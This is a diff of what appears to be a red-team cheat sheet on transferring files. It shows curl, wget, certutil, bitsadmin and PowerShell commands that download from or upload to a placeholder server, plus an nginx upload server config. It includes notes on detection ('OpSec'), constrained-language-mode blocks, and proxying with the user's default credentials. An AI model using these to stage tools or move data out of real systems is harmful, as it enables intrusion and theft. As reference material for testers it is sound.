@@ -29,6 +29,8 @@ curl -o ./output.bin http://192.0.2.1:8080/input.bin
 wget -O ./output.txt http://192.0.2.1:8080/input.txt
 ~~~
 
+`curl.exe` is preinstalled since Windows 10.
+
 Windows builtins.
 
 ~~~ bat
@@ -36,7 +38,7 @@ certutil.exe -urlcache -f http://192.0.2.1:8080/input.bin .\output.bin
 bitsadmin.exe /transfer myjob http://192.0.2.1:8080/input.bin %cd%\output.bin
 ~~~
 
-`curl.exe` is preinstalled since Windows 10.
+> **OpSec:** Mature organizations probably have detection rules for the Windows builtins.
 
 PowerShell variants.
 
@@ -45,14 +47,21 @@ iwr http://192.0.2.1:8080/input.bin -useb -outf .\output.bin
 Invoke-WebRequest -Uri http://192.0.2.1:8080/input.bin -UseBasicParsing -OutFile .\output.bin
 irm http://192.0.2.1:8080/intput.txt > ./output.txt
 Invoke-RestMethod http://192.0.2.1:8080/intput.txt > ./output.txt
-(New-Object System.Net.WebClient).DownloadFile('http://192.0.2.1:8080/input.bin',"$(pwd)\output.bin")  # doesnt work in constrained language mode
+(New-Object System.Net.WebClient).DownloadFile('http://192.0.2.1:8080/input.bin',"$(pwd)\output.bin")  # blocked in clm
 ~~~
 
-> **OpSec:** Mature organizations probably have detection rules for the Windows builtins.
+Configure PowerShell `WebClient` to use a HTTP proxy.
+
+~~~ powershell
+$c = New-Object System.Net.WebClient
+$c.proxy = [Net.WebRequest]::GetSystemWebProxy()
+$c.proxy.credentials = [Net.CredentialCache]::DefaultCredentials
+$c.DownloadFile('http://192.0.2.1:8080/input.bin',"$(pwd)\output.bin")
+~~~
 
 # Upload via PUT
 
-Linux utility.
+Linux and Windows utility.
 
 ~~~ bash
 curl -T ./input.bin http://192.0.2.1:8080/output.bin
@@ -61,7 +70,7 @@ curl -T ./input.bin http://192.0.2.1:8080/output.bin
 PowerShell.
 
 ~~~ powershell
-(New-Object System.Net.WebClient).UploadFile('http://192.0.2.1:8080/output.bin', "$(pwd)\input.bin")  # doesn't work in constrained languge mode
+(New-Object System.Net.WebClient).UploadFile('http://192.0.2.1:8080/output.bin', "$(pwd)\input.bin")  # blocked in clm
 ~~~
 
 # Server
@@ -99,8 +108,8 @@ Nginx with authentication and file upload.
 http {
   server {
     server_name localhost;
-    listen 8080 default_server;
-    listen [::]:8080 default_server;
+    listen 80 default_server;
+    listen [::]:80 default_server;
 
     auth_basic "Restricted";
     auth_basic_user_file ./htpasswd;
